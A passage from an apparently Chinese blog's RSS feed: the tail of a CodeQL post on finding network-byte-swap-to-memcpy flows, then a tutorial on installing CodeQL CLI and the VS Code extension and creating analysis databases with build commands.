DataFlow::PathNode source, DataFlow::PathNode sink&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where cfg.hasFlowPath(source, sink)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select sink, source, sink, &amp;quot;Network byte swap flows to memcpy&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;传送门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传送门&#34;&gt;#&lt;/a&gt; 传送门&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://lgtm.com/help/lgtm/console/ql-cpp-basic-example&#34;&gt;cpp 规则语法说明&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://docs.oracle.com/javase/7/docs/api/java/util/regex/Pattern.html&#34;&gt; Java 正则模式&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://securitylab.github.com/research/cve-2018-4259-macos-nfs-vulnerability/&#34;&gt;给出的参考案例：CVE-2018-4259: MacOS NFS vulnerabilties lead to kernel RCE&lt;/a&gt;（知识点挺多的）&lt;br&gt;
&lt;a href=&#34;https://bestwing.me/codeql.html&#34;&gt;codeql-swing&lt;/a&gt;（swing 的语言云淡风轻，条理清晰，如沐春风，我的的语言阿巴阿巴阿巴）&lt;br&gt;
&lt;a href=&#34;https://github.com/github/securitylab/discussions&#34;&gt;讨论区&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/10/CodeQLforVSCode%E6%90%AD%E5%BB%BA%E6%B5%81%E7%A8%8B/</guid>
            <title>CodeQLforVSCode搭建流程</title>
            <link>http://example.com/2022/06/10/CodeQLforVSCode%E6%90%AD%E5%BB%BA%E6%B5%81%E7%A8%8B/</link>
            <category>codeql, 搭建教程</category>
            <pubDate>Fri, 10 Jun 2022 10:36:34 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&#34;visual-studio-code安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#visual-studio-code安装&#34;&gt;#&lt;/a&gt; Visual Studio Code 安装&lt;/h1&gt;
&lt;p&gt;都是免费的哈哈哈&lt;br&gt;
&lt;a href=&#34;https://code.visualstudio.com/Download&#34;&gt;官网下载&lt;/a&gt;&lt;br&gt;
&lt;img src=&#34;89f3979d3be08c5479bf1a9fac4ae8f4.png&#34; alt=&#34;89f3979d3be08c5479bf1a9fac4ae8f4.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;codeql安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#codeql安装&#34;&gt;#&lt;/a&gt; CodeQL 安装&lt;/h1&gt;
&lt;h2 id=&#34;使用chocolatey安装codeql-cli&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用chocolatey安装codeql-cli&#34;&gt;#&lt;/a&gt; 使用 Chocolatey 安装 CodeQL cli&lt;/h2&gt;
&lt;p&gt;使用 choco 安装可透过指令执行且环境变数也会自动设定好&lt;br&gt;
管理员权限打开 cmd&lt;br&gt;
 运行 &lt;code&gt;choco install codeql&lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;8e97ed84bc39ad6f0c5ccda34d479d90.png&#34; alt=&#34;8e97ed84bc39ad6f0c5ccda34d479d90.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;安装成功&lt;br&gt;
&lt;img src=&#34;c79f98196394ebe90a752eb4bf512411.png&#34; alt=&#34;c79f98196394ebe90a752eb4bf512411.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果想要自定义安装目录的话，需要更改一下环境变量&lt;br&gt;
 ChocolateyInstall 就是默认的安装路径&lt;br&gt;
&lt;img src=&#34;03c3720b2dfed7a1702603e97ea56e19.png&#34; alt=&#34;03c3720b2dfed7a1702603e97ea56e19.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;gihub下载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gihub下载&#34;&gt;#&lt;/a&gt; gihub 下载&lt;/h2&gt;
&lt;p&gt;先下载 codeql-cli&lt;br&gt;
 选择对应操作系统下载即可&lt;br&gt;
&lt;img src=&#34;be05dbbd44da6e49e5a161a120478255.png&#34; alt=&#34;be05dbbd44da6e49e5a161a120478255.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/github/codeql-cli-binaries&#34;&gt;https://github.com/github/codeql-cli-binaries&lt;/a&gt;&lt;br&gt;
 下载好解压至自己选定的文件夹，再添加系统变量&lt;br&gt;
这里我将 codeql 文件夹名称改为 codeql-cli&lt;br&gt;
&lt;img src=&#34;cc76037dd0f7125ff2fa7ec3b2686824.png&#34; alt=&#34;cc76037dd0f7125ff2fa7ec3b2686824.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在命令行输入 codeql，如下图即配置成功&lt;br&gt;
若提示找不到该命令，重启后再执行命令&lt;br&gt;
&lt;img src=&#34;f81317bf86bb5b8ece642a207391842b.png&#34; alt=&#34;f81317bf86bb5b8ece642a207391842b.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;下载 codeql 规则库（使用 starter workspace 可跳过此步骤）&lt;br&gt;
&lt;a href=&#34;https://github.com/github/codeql&#34;&gt;https://github.com/github/codeql&lt;/a&gt;&lt;br&gt;
 在 codeql 文件夹下打开 cmd&lt;br&gt;
 执行 &lt;code&gt;git clone https://github.com/github/codeql codeql-repo&lt;/code&gt; &lt;br&gt;
 下载完后如图&lt;br&gt;
&lt;img src=&#34;3aeebb3aca934f76ef649ccf7d200fb6.png&#34; alt=&#34;3aeebb3aca934f76ef649ccf7d200fb6.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;下载之后安装codeql插件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#下载之后安装codeql插件&#34;&gt;#&lt;/a&gt; 下载之后安装 codeql 插件&lt;/h1&gt;
&lt;p&gt;有三种方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在 VS 插件中搜索 codeql 点击安装&lt;br&gt;
&lt;img src=&#34;9536c545af16d13d030ff3c42f767471.png&#34; alt=&#34;9536c545af16d13d030ff3c42f767471.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;浏览器打开&lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql&#34;&gt;商城&lt;/a&gt;下载&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;github 中下载&lt;a href=&#34;https://github.com/github/vscode-codeql/releases&#34;&gt; VSIX 文件&lt;/a&gt;&lt;br&gt;
在 more actions 中选择从 VSIX 文件安装&lt;br&gt;
&lt;img src=&#34;c748a4d35418471f99408284979433eb.png&#34; alt=&#34;c748a4d35418471f99408284979433eb.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;配置codeql-cli&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置codeql-cli&#34;&gt;#&lt;/a&gt; 配置 codeql-cli&lt;/h1&gt;
&lt;p&gt;终端无法访问扩展管理的 cli&lt;br&gt;
 可以自己下载 codeql, 并在插件中配置路径&lt;br&gt;
这样终端可以访问&lt;br&gt;
这个插件是使用 codeql-cli 编译并运行规则的，要确保下载的版本支持该插件即可&lt;br&gt;
&lt;img src=&#34;64d75944e23735a29f128c932e7824b7.png&#34; alt=&#34;64d75944e23735a29f128c932e7824b7.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Executable Path 输入 codeql.exe 所在路径&lt;br&gt;
&lt;img src=&#34;9ab953a7697bf20458868981a2523a3c.png&#34; alt=&#34;9ab953a7697bf20458868981a2523a3c.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;配置规则&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置规则&#34;&gt;#&lt;/a&gt; 配置规则&lt;/h1&gt;
&lt;p&gt;两种方法建立 codeql workspace&lt;br&gt;
 第一种就是把要审计的代码放入 codeql 中&lt;br&gt;
第二种是把 codeql 加入要审计的代码的 workspace 中&lt;/p&gt;
&lt;h2 id=&#34;使用starter-workspace也就是git仓库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用starter-workspace也就是git仓库&#34;&gt;#&lt;/a&gt; 使用‘starter workspace’，也就是 git 仓库&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;下载 starter&lt;br&gt;
 &lt;code&gt;git clone --recursive https://github.com/github/vscode-codeql-starter/&lt;/code&gt; &lt;br&gt;
 或者&lt;br&gt;
 &lt;code&gt;git clone https://github.com/github/vscode-codeql-starter/&lt;/code&gt; &lt;br&gt;
 项目下载完成后，进入项目目录&lt;br&gt;
 &lt;code&gt;git submodule update --init &lt;/code&gt; &lt;br&gt;
 &lt;code&gt;git submodule update --remote&lt;/code&gt; &lt;br&gt;
 确保包含需要的子模块&lt;br&gt;
截图使用的是第一种方法&lt;br&gt;
&lt;img src=&#34;:/c7bf21f2a552483780c58a4ee06b70a0&#34; alt=&#34;479934456f6c44228c2f3e8057ac0e86.png&#34;&gt;&lt;br&gt;
 子模块需要定期更新&lt;br&gt;
&lt;img src=&#34;:/3c8180aaa0b040ecaafd4217cbc18503&#34; alt=&#34;ef88b51020a9d4ed8fdb5bda8029fc94.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 VS Code 中打开 starter workspace&lt;br&gt;
&lt;img src=&#34;:/29486ddc144542318d779b859916c3fb&#34; alt=&#34;84a6738a5e83ddeb45752d064e986647.png&#34;&gt;&lt;br&gt;
&lt;img src=&#34;:/b02d0248007c458a8554fcc54a7d04ea&#34; alt=&#34;4e682ce5e87fbc0dd1897081928067fd.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注意：&lt;br&gt;
starter 子模块中包括 C/C++, C#, Java, JavaScript, Python, Ruby 以及 GO 的规则，在 vscode-codeql-starter\ql 下&lt;br&gt;
 CodeQL 暂时无法扫描 php 代码&lt;/p&gt;
&lt;h2 id=&#34;将codeql规则库加入现有的工作站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#将codeql规则库加入现有的工作站&#34;&gt;#&lt;/a&gt; 将 CodeQL 规则库加入现有的工作站&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;此种方法未实现，仅按文档进行流程说明&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将下载好的本地 CodeQL 库加入你的 workspace&lt;br&gt;
&lt;a href=&#34;https://github.com/github/codeql&#34;&gt;CodeQL 库下载链接&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;选择 File &amp;gt; Add Folder to Workspace，加入下载好的 codeql 库&lt;br&gt;
&lt;img src=&#34;:/97e2d507bde8497d9d9d5c54a79c7da3&#34; alt=&#34;3ccc9692c80a5e50bf93123ffbf04e4c.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;每种语言都要创建一个新的文件夹&lt;br&gt;
通过 New Folder 或者 Add Folder to Workspace 选项&lt;br&gt;
放置你的自定义规则和规则库&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在每个语言目录下新建一个 qlpack.yml 文件&lt;br&gt;
用来告诉 CodeQL，这个目录下的语言类型和依赖包&lt;br&gt;
例如：&lt;br&gt;
在 C&lt;ins&gt; 代码目录下自定义一个 CodeQL 文件夹名为’my-custom-cpp-pack’&lt;br&gt;
在 C&lt;/ins&gt; 代码目录下创建一个 qlpack.yml 文件，内容如下&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;name: my-custom-cpp-pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;version: 0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libraryPathDependencies: codeql/cpp-all&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;br&gt;
GO 语言的规则库并不在 github/codeql 中&lt;br&gt;
扫描 GO 代码，需要下载 https://github.com/github/codeql-go&lt;br&gt;
 然后将规则像上面说的这样加入规则库&lt;br&gt;
（starter 中都是包含的）&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;运行codeql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#运行codeql&#34;&gt;#&lt;/a&gt; 运行 CodeQL&lt;/h1&gt;
&lt;h2 id=&#34;选择数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#选择数据库&#34;&gt;#&lt;/a&gt; 选择数据库&lt;/h2&gt;
&lt;p&gt;扫描分析一个 project，我们需要建立一个 CodeQL 数据库&lt;br&gt;
在侧边栏打开 CodeQL 数据库&lt;br&gt;
如图有四种添加数据库的方法&lt;br&gt;
&lt;img src=&#34;b9557aadc5d02dcc220fc4f20977e102.png&#34; alt=&#34;b9557aadc5d02dcc220fc4f20977e102.png&#34;&gt;&lt;br&gt;
 当添加数据库之后，会有数据库视图&lt;br&gt;
可以右击列表中的项进行数据库交互&lt;br&gt;
可以利用 Ctrl/Cmd+click 选择多个数据库&lt;/p&gt;
&lt;h2 id=&#34;创建本地数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#创建本地数据库&#34;&gt;#&lt;/a&gt; 创建本地数据库&lt;/h2&gt;
&lt;p&gt;如果没有存在的数据库导入，也可以先创建一个本地数据库&lt;br&gt;
有三种方法&lt;/p&gt;
&lt;h3 id=&#34;通过coedql-cli创建一个数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过coedql-cli创建一个数据库&#34;&gt;#&lt;/a&gt; 通过 coedql-cli 创建一个数据库&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;执行命令：
`codeql database create &amp;lt;database&amp;gt; --language=&amp;lt;language-identifier&amp;gt;`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参数说明：&lt;br&gt;
 &lt;code&gt;&amp;lt;database&amp;gt;&lt;/code&gt; ：创建数据库的路径，目录会在执行命令的时候被创建&lt;br&gt;
 &lt;code&gt;--language&lt;/code&gt; : 指定数据库语言，输入标识符。当和–db-cluster 一起使用时，可以指定多个，用’,&#39; 分隔，也可以进行多次指定。&lt;br&gt;
 &lt;code&gt;--db-cluster&lt;/code&gt; ：为多种语言创建数据库&lt;br&gt;
 &lt;code&gt;--command&lt;/code&gt; ：创建一个或多个编译语言数据库的时候使用。python 和 JavaScript/TypeScript 不需要该参数，如果编译语言不带该参数，codeql 会自动检测并编译&lt;br&gt;
 &lt;code&gt;--no-run-unnecessary-builds&lt;/code&gt; ：为多语言创建数据库，且包括编译和非编译语言时，可以利用  &lt;code&gt;--no-run-unnecessary-builds&lt;/code&gt;  来帮助非编译语言跳过 command 选项&lt;br&gt;
&lt;a href=&#34;https://codeql.github.com/docs/codeql-cli/manual/database-create/&#34;&gt;更多参数说明&lt;/a&gt;&lt;br&gt;
 CodeQL 支持以下语言&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;语言&lt;/th&gt;
&lt;th&gt;标识符&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;C/C++&lt;/td&gt;
&lt;td&gt;cpp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;C#&lt;/td&gt;
&lt;td&gt;csharp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GO&lt;/td&gt;
&lt;td&gt;go&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Java&lt;/td&gt;
&lt;td&gt;java&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JavaScript/TypeScript&lt;/td&gt;
&lt;td&gt;javascript&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Python&lt;/td&gt;
&lt;td&gt;python&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ruby&lt;/td&gt;
&lt;td&gt;ruby&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;找了 codeql-repo 中的 python 案列测试创建数据库成功&lt;br&gt;
&lt;img src=&#34;48af0641ac03eb15ee8781d860f9e724.png&#34; alt=&#34;48af0641ac03eb15ee8781d860f9e724.png&#34;&gt;&lt;br&gt;
&lt;img src=&#34;18db53f51f1f4c80cbae05e19d286cb4.png&#34; alt=&#34;18db53f51f1f4c80cbae05e19d286cb4.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;官方给出的command案例&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#官方给出的command案例&#34;&gt;#&lt;/a&gt; 官方给出的 command 案例&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Specifying build commands&lt;/p&gt;
&lt;p&gt;The following examples are designed to give you an idea of some of the build commands that you can specify for compiled languages.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Important&lt;/p&gt;
&lt;p&gt;The  &lt;code&gt;--command&lt;/code&gt;  option accepts a single argument—if you need to use more than one command, specify  &lt;code&gt;--command&lt;/code&gt;  multiple times.&lt;/p&gt;
&lt;p&gt;If you need to pass subcommands and options, the whole argument needs to be quoted to be interpreted correctly.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;C/C++ project built using  &lt;code&gt;make&lt;/code&gt; :&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;codeql database create cpp-database --language=cpp --command=make&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;C# project built using  &lt;code&gt;dotnet build&lt;/code&gt;  (.NET Core 3.0 or later):&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;codeql database create csharp-database --language=csharp --command=&amp;#x27;dotnet build /t:rebuild&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;On Linux and macOS (but not Windows), you need to disable shared compilation when building C# projects with .NET Core 2 or earlier, so expand the command to:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;codeql database create csharp-database --language=csharp --command=&amp;#x27;dotnet build /p:UseSharedCompilation=false /t:rebuild&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Go project built using the  &lt;code&gt;COEQL_EXTRACTOR_GO_BUILD_TRACING=on&lt;/code&gt;  environment variable:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;CODEQL_EXTRACTOR_GO_BUILD_TRACING=on codeql database create go-database --language=go&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Go project built using a custom build script:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;codeql database create go-database --language=go --command=&amp;#x27;./scripts/build.sh&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java project built using Gradle:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;codeql database create java-database --language=java --command=&amp;#x27;gradle clean test&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java project built using Maven:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;codeql database create java-database --language=java --command=&amp;#x27;mvn clean install&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java project built using Ant:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;codeql database create java-database --language=java --command=&amp;#x27;ant -f build.xml&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Project built using Bazel:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# Navigate to the Bazel workspace.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Before building, remove cached objects&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# and stop all running Bazel server processes.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bazel clean --expunge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Build using the following Bazel flags, to help CodeQL detect the build:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# `--spawn_strategy=local`: build locally, instead of using a distributed build&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# `--nouse_action_cache`: turn off build caching, which might prevent recompilation of source code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# `--noremote_accept_cached`, `--noremote_upload_local_results`: avoid using a remote cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;codeql database create new-database --language=&amp;lt;language&amp;gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --command=&amp;#x27;bazel build --spawn_strategy=local --nouse_action_cache --noremote_accept_cached --noremote_upload_local_results //path/to/package:target&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# After building, stop all running Bazel server processes.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# This ensures future build commands start in a clean Bazel server process&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# without CodeQL attached.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bazel shutdown&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Project built using a custom build script:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;codeql database create new-database --language=&amp;lt;language&amp;gt; --command=&amp;#x27;./scripts/build.sh&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;This command runs a custom script that contains all of the commands required to build the project.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;剩下两种方法未测试仅给出说明链接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#剩下两种方法未测试仅给出说明链接&#34;&gt;#&lt;/a&gt; 剩下两种方法未测试，仅给出&lt;a href=&#34;https://codeql.github.com/docs/codeql-for-visual-studio-code/analyzing-your-projects/&#34;&gt;说明链接&lt;/a&gt;&lt;/h3&gt;
